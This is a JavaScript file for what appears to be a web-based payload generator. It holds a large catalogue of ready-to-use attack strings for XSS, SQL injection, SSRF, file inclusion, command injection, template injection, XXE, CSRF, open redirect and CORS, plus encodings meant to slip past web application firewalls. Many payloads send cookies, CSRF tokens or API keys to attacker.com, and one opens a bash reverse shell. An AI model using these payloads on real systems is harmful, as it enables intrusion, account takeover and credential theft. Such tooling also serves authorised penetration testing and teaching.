// ==========================================
// PAYLOAD GENERATOR ENGINE v2 (Advanced)
// ==========================================

const VulnData = {
  xss: {
    contexts: [
      { id: 'html_body', label: 'HTML Body (e.g. <div>[here]</div>)' },
      { id: 'attribute_dq', label: 'Attribute - Double Quotes (e.g. value="[here]")' },
      { id: 'attribute_sq', label: 'Attribute - Single Quotes (e.g. value=\'[here]\')' },
      { id: 'script_string', label: 'Inside <script> String (e.g. var x = "[here]";)' },
      { id: 'svg', label: 'SVG Context (<svg>)' },
      { id: 'markdown', label: 'Markdown Link ([a](...))' },
      { id: 'angular', label: 'AngularJS Template ({{...}})' }
    ],
    actions: [
      { id: 'alert', label: 'Alert Popup (Proof of Concept)' },
      { id: 'cookie_steal', label: 'Steal Cookies' },
      { id: 'dom_read', label: 'Read DOM / CSRF Token' }
    ]
  },
  sqli: {
    contexts: [
      { id: 'int', label: 'Integer (e.g. id=[here])' },
      { id: 'string_dq', label: 'String - Double Quotes (e.g. name="[here]")' },
      { id: 'string_sq', label: 'String - Single Quotes (e.g. name=\'[here]\')' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
      { id: 'union_extract', label: 'UNION Data Extraction' },
      { id: 'enum_tables', label: 'Enumerate Tables (information_schema)' },
      { id: 'enum_columns', label: 'Enumerate Columns (information_schema)' },
      { id: 'error_extract', label: 'Error-Based Extraction' },
      { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
    ]
  },
  ssrf: {
    contexts: [
      { id: 'url_param', label: 'Full URL Parameter (e.g. ?url=[here])' },
      { id: 'path_append', label: 'Path Append (e.g. api.com/[here])' }
    ],
    actions: [
      { id: 'aws_metadata', label: 'AWS Metadata Exfiltration' },
      { id: 'gcp_metadata', label: 'GCP Metadata Exfiltration' },
      { id: 'localhost_port', label: 'Localhost Port Scan' },
      { id: 'ipv6_bypass', label: 'IPv6 Localhost Bypass' }
    ]
  },
  lfi: {
    contexts: [
      { id: 'direct_file', label: 'Direct File Inclusion (e.g. ?file=[here])' },
      { id: 'path_traversal', label: 'Path Traversal (e.g. ?file=folder/[here])' }
    ],
    actions: [
      { id: 'read_passwd', label: 'Read /etc/passwd' },
      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' },
      { id: 'php_wrapper', label: 'PHP Wrapper (Base64 Extract)' }
    ]
  },
  cmdi: {
    contexts: [
      { id: 'direct', label: 'Direct Execution (e.g. ?cmd=[here])' },
      { id: 'blind', label: 'Blind / Chained Execution (e.g. ping [here])' }
    ],
    actions: [
      { id: 'rev_shell', label: 'Reverse Shell (Bash)' },
      { id: 'read_file', label: 'Read /etc/passwd' },
      { id: 'ping_delay', label: 'Ping Delay (Blind PoC)' }
    ]
  },
  ssti: {
    contexts: [
      { id: 'jinja2', label: 'Jinja2 / Twig (Python/PHP)' },
      { id: 'erb', label: 'ERB (Ruby)' }
    ],
    actions: [
      { id: 'math', label: 'Math Evaluation (PoC)' },
      { id: 'rce', label: 'Remote Code Execution' }
    ]
  },
  xxe: {
    contexts: [
      { id: 'classic_xml', label: 'Classic XML Payload' },
      { id: 'soap_body', label: 'SOAP Body Payload' }
    ],
    actions: [
      { id: 'local_file', label: 'Read Local File (/etc/passwd)' },
      { id: 'oob', label: 'Out-Of-Band (OOB) Extraction' }
    ]
  },
  csrf: {
    contexts: [
      { id: 'html_form', label: 'Auto-submitting HTML Form' },
      { id: 'ajax_fetch', label: 'AJAX / Fetch API Request' }
    ],
    actions: [
      { id: 'state_change', label: 'State Change (e.g. Change Email)' }
    ]
  },
  open_redirect: {
    contexts: [
      { id: 'url_param', label: 'URL Parameter (e.g. ?redirect=[here])' },
      { id: 'path_based', label: 'Path-based (e.g. /out/[here])' }
    ],
    actions: [
      { id: 'phishing', label: 'Redirect to Phishing Domain' },
      { id: 'js_exec', label: 'JavaScript Execution (javascript:alert)' }
    ]
  },
  cors: {
    contexts: [
      { id: 'null_origin', label: 'Null Origin Reflection' },
      { id: 'arb_origin', label: 'Arbitrary Origin Reflection' }
    ],
    actions: [
      { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
    ]
  }
};

const PayloadTemplates = {
  xss: {
    alert: {
      html_body: { code: "<script>alert(document.domain)</script>", desc: "Direct injection of a script tag." },
      attribute_dq: { code: "\"><script>alert(document.domain)</script>", desc: "Breaks out of the double-quote attribute using `\">`." },
      attribute_sq: { code: "'><script>alert(document.domain)</script>", desc: "Breaks out of the single-quote attribute using `'>`." },
      script_string: { code: "\"; alert(document.domain); //", desc: "Breaks out of the JavaScript string using `\";`." },
      svg: { code: "<svg onload=alert(1)>", desc: "Uses an SVG tag with the `onload` event. Often bypasses standard HTML tag filters." },
      markdown: { code: "[a](javascript:alert(1))", desc: "Exploits Markdown parsers that do not sanitize the `href` attribute of links." },
      angular: { code: "{{$on.constructor('alert(1)')()}}", desc: "AngularJS sandbox escape. Reaches the function constructor to execute arbitrary JavaScript." }
    },
    cookie_steal: {
      html_body: { code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "Uses an image tag with an invalid source to trigger `onerror`." },
      attribute_dq: { code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"", desc: "Injects HTML5 `autofocus` with `onfocus` event handler." },
      attribute_sq: { code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'", desc: "Same as above but breaking out of single quotes." },
      script_string: { code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //", desc: "Breaks JS string and executes the fetch request." },
      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "Steals cookies upon SVG rendering." },
      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?c='+document.cookie))", desc: "Steals cookies when the markdown link is clicked." },
      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?c=`+document.cookie)')()}}", desc: "Angular sandbox escape for cookie exfiltration." }
    },
    dom_read: {
      html_body: { code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Reads a CSRF token from the DOM." },
      attribute_dq: { code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
      attribute_sq: { code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
      script_string: { code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //", desc: "Breaks JS string and reads CSRF token." },
      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)\">", desc: "Reads CSRF token upon SVG rendering." },
      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content))", desc: "Reads CSRF token when link is clicked." },
      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?token=`+document.getElementsByName(`csrf-token`)[0].content)')()}}", desc: "Angular sandbox escape for CSRF extraction." }
    }
  },
  sqli: {
    auth_bypass: {
      int: { code: "1 OR 1=1", desc: "Modifies the WHERE clause to evaluate to TRUE." },
      string_dq: { code: "\" OR \"1\"=\"1", desc: "Closes the double quote string and appends a tautology." },
      string_sq: { code: "' OR '1'='1", desc: "Closes the single quote string and appends a tautology." }
    },
    union_extract: {
      int: { code: "-1 UNION SELECT username, password FROM users-- -", desc: "Uses -1 to make the first query empty, then appends results." },
      string_dq: { code: "\" UNION SELECT username, password FROM users-- -", desc: "Closes double quotes and uses UNION." },
      string_sq: { code: "' UNION SELECT username, password FROM users-- -", desc: "Closes single quotes and uses UNION." }
    },
    enum_tables: {
      int: { code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Extracts table names from the current database by querying the information_schema metadata table." },
      string_dq: { code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks double quotes and extracts table names from information_schema." },
      string_sq: { code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks single quotes and extracts table names from information_schema." }
    },
    enum_columns: {
      int: { code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Extracts column names for a specific table (replace [YOUR_TABLE_NAME] with the target table) from information_schema." },
      string_dq: { code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks double quotes and extracts column names for a specific table." },
      string_sq: { code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks single quotes and extracts column names for a specific table." }
    },
    error_extract: {
      int: { code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))", desc: "MySQL Error-based extraction. Forces a syntax error that outputs the result in the error message." },
      string_dq: { code: "\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "Breaks double quotes and forces an XML extraction error." },
      string_sq: { code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "Breaks single quotes and forces an XML extraction error." }
    },
    time_delay: {
      int: { code: "1; WAITFOR DELAY '0:0:5'--", desc: "SQL Server time delay payload." },
      string_dq: { code: "\"; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." },
      string_sq: { code: "'; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." }
    }
  },
  ssrf: {
    aws_metadata: {
      url_param: { code: "http://169.254.169.254/latest/meta-data/", desc: "Directly requests the AWS EC2 metadata IP address." },
      path_append: { code: "@169.254.169.254/latest/meta-data/", desc: "Uses the @ symbol to treat the preceding URL as credentials." }
    },
    gcp_metadata: {
      url_param: { code: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", desc: "Requests GCP metadata. Note: Requires 'Metadata-Flavor: Google' header in a real attack." },
      path_append: { code: "@metadata.google.internal/computeMetadata/v1/", desc: "Appends to GCP internal DNS." }
    },
    localhost_port: {
      url_param: { code: "http://127.0.0.1:22", desc: "Requests port 22 on localhost to check for open SSH." },
      path_append: { code: "@127.0.0.1:22", desc: "Uses @ to redirect the internal request to localhost port 22." }
    },
    ipv6_bypass: {
      url_param: { code: "http://[::]:80/", desc: "Uses the IPv6 representation of localhost to bypass filters looking for 127.0.0.1." },
      path_append: { code: "@[::]:80/", desc: "Appends IPv6 localhost bypassing standard WAF regexes." }
    }
  },
  lfi: {
    read_passwd: {
      direct_file: { code: "/etc/passwd", desc: "Direct absolute path to read the Linux password file." },
      path_traversal: { code: "../../../../../../../../../etc/passwd", desc: "Uses multiple `../` to traverse up to the root directory." }
    },
    read_win_ini: {
      direct_file: { code: "C:\\Windows\\win.ini", desc: "Absolute path for Windows systems." },
      path_traversal: { code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", desc: "Windows path traversal using backslashes." }
    },
    php_wrapper: {
      direct_file: { code: "php://filter/convert.base64-encode/resource=index.php", desc: "Uses PHP filters to Base64 encode the target file before it is executed/included. This allows reading backend source code." },
      path_traversal: { code: "php://filter/convert.base64-encode/resource=../../../../config.php", desc: "Combines path traversal with PHP Base64 filters to read configuration files safely without triggering execution." }
    }
  },
  cmdi: {
    rev_shell: {
      direct: { code: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", desc: "Classic Bash reverse shell. Requires a listener on attacker.com:4444." },
      blind: { code: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 |", desc: "Breaks out of the current command using `;` or `|` and executes the reverse shell." }
    },
    read_file: {
      direct: { code: "cat /etc/passwd", desc: "Directly executes the cat command to read sensitive files." },
      blind: { code: "; cat /etc/passwd #", desc: "Chains the command using `;` and comments out the remainder using `#`." }
    },
    ping_delay: {
      direct: { code: "ping -c 10 127.0.0.1", desc: "Pings localhost 10 times to create a ~10 second delay. Used for Blind RCE confirmation." },
      blind: { code: "| ping -c 10 127.0.0.1 |", desc: "Pipes the output into a ping command to create a noticeable time delay." }
    }
  },
  ssti: {
    math: {
      jinja2: { code: "{{7*7}}", desc: "Jinja2/Twig mathematical evaluation. If it renders as 49, SSTI is confirmed." },
      erb: { code: "<%= 7*7 %>", desc: "Ruby ERB mathematical evaluation." }
    },
    rce: {
      jinja2: { code: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", desc: "Jinja2 Python Sandbox Escape. Traverses the global objects to import the OS module and execute 'id'." },
      erb: { code: "<%= system('id') %>", desc: "Ruby ERB Remote Code Execution using the system() function." }
    }
  },
  xxe: {
    local_file: {
      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", desc: "Classic XXE. Defines an external entity pointing to a local file and calls it in the XML body." },
      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>", desc: "XXE payload injected specifically into a SOAP request structure." }
    },
    oob: {
      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>", desc: "Out-of-band XXE. Fetches a remote DTD from the attacker server which then defines entities to send data back." },
      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>", desc: "Out-of-band XXE mapped into a SOAP body." }
    }
  },
  csrf: {
    state_change: {
      html_form: { code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>", desc: "Auto-submitting HTML form. When the victim visits this page, their browser automatically submits a POST request to change their email." },
      ajax_fetch: { code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>", desc: "AJAX based CSRF. Uses fetch with `credentials: 'include'` to send the victim's cookies automatically." }
    }
  },
  open_redirect: {
    phishing: {
      url_param: { code: "http://attacker.com", desc: "Basic redirect to a phishing domain." },
      path_based: { code: "//attacker.com", desc: "Protocol-relative URL. Bypasses filters that check if the URL starts with a single `/`." }
    },
    js_exec: {
      url_param: { code: "javascript:alert(document.cookie)", desc: "If the application uses the redirect parameter inside an `href` attribute without validation, this executes JavaScript." },
      path_based: { code: "javascript:alert(document.cookie)", desc: "Executes JavaScript via the javascript pseudo-protocol." }
    }
  },
  cors: {
    steal_api: {
      null_origin: { code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>", desc: "Exploits a server that trusts the `null` origin. Uses an iframe with a restrictive sandbox to force a `null` origin, then sends an authenticated XHR request to steal API keys." },
      arb_origin: { code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>", desc: "Exploits a server that trusts any arbitrary origin. A script hosted on `attacker.com` makes an authenticated request and exfiltrates the response." }
    }
  }
};

document.addEventListener("DOMContentLoaded", () => {
  const vulnClassEl = document.getElementById("vuln-class");
  const contextEl = document.getElementById("vuln-context");
  const actionEl = document.getElementById("vuln-action");
  const filterEl = document.getElementById("vuln-filter");
  const btnGenerate = document.getElementById("btn-generate");
  const btnCopy = document.getElementById("btn-copy");
  const outputCode = document.getElementById("output-code");
  const outputExplanation = document.getElementById("output-explanation");

  function populateDropdowns() {
    const vClass = vulnClassEl.value;
    const data = VulnData[vClass];

    // Populate Contexts
    contextEl.innerHTML = "";
    data.contexts.forEach(ctx => {
      const opt = document.createElement("option");
      opt.value = ctx.id;
      opt.textContent = ctx.label;
      contextEl.appendChild(opt);
    });

    // Populate Actions
    actionEl.innerHTML = "";
    data.actions.forEach(act => {
      const opt = document.createElement("option");
      opt.value = act.id;
      opt.textContent = act.label;
      actionEl.appendChild(opt);
    });
  }

  vulnClassEl.addEventListener("change", populateDropdowns);
  populateDropdowns(); // Init

  function applyFilter(code, filterType) {
    if (filterType === "urlencode") {
      return encodeURIComponent(code);
    } else if (filterType === "doubleurlencode") {
      return encodeURIComponent(encodeURIComponent(code));
    } else if (filterType === "base64") {
      return btoa(unescape(encodeURIComponent(code)));
    } else if (filterType === "htmlentity") {
      return code.replace(/[\u00A0-\u9999<>\&]/g, function(i) {
        return '&#'+i.charCodeAt(0)+';';
      });
    } else if (filterType === "hex") {
      return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
    } else if (filterType === "casevar") {
      return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
    }
    return code; // none
  }

  function getFilterExplanation(filterType) {
    if (filterType === "urlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (URL Encode):</strong> The payload is URL encoded to bypass basic WAFs that inspect raw HTTP requests.";
    } else if (filterType === "doubleurlencode") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Double URL Encode):</strong> Useful when the application decodes the input twice. The WAF sees valid characters and lets it pass, while the backend decodes it into the malicious payload.";
    } else if (filterType === "base64") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Base64):</strong> The payload is Base64 encoded. Useful if the application explicitly expects Base64 input and decodes it before executing.";
    } else if (filterType === "htmlentity") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (HTML Entity):</strong> Characters are converted to HTML entities (e.g., `&#60;` for `<`). If the backend framework decodes HTML entities before placing them into a vulnerable sink, this bypasses regex filters.";
    } else if (filterType === "hex") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Hex Encoding):</strong> Characters are represented by their hexadecimal values. Often used to evade poorly configured WAFs that don't normalize input.";
    } else if (filterType === "casevar") {
      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Case Variation):</strong> Alternates uppercase and lowercase letters. Bypasses filters that only block exact matches like `<script>` but fail to block `<sCrIpT>`.";
    }
    return "";
  }

  btnGenerate.addEventListener("click", () => {
    const vClass = vulnClassEl.value;
    const vContext = contextEl.value;
    const vAction = actionEl.value;
    const vFilter = filterEl.value;

    let payloadData = null;
    try {
      payloadData = PayloadTemplates[vClass][vAction][vContext];
    } catch(e) {}

    if (payloadData) {
      const finalCode = applyFilter(payloadData.code, vFilter);
      outputCode.textContent = finalCode;
      outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);
      
      // Animation effect
      outputCode.parentElement.style.transform = "scale(0.98)";
      setTimeout(() => outputCode.parentElement.style.transform = "scale(1)", 150);
    } else {
      outputCode.textContent = "Error: Payload combination not found.";
      outputExplanation.textContent = "Please select different parameters.";
    }
  });

  btnCopy.addEventListener("click", () => {
    const textToCopy = outputCode.textContent;
    if (textToCopy && textToCopy !== "// Select options and click Generate...") {
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = btnCopy.innerHTML;
        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
        btnCopy.style.color = "var(--accent-green)";
        setTimeout(() => {
          btnCopy.innerHTML = originalText;
          btnCopy.style.color = "var(--text-secondary)";
        }, 2000);
      });
    }
  });
});
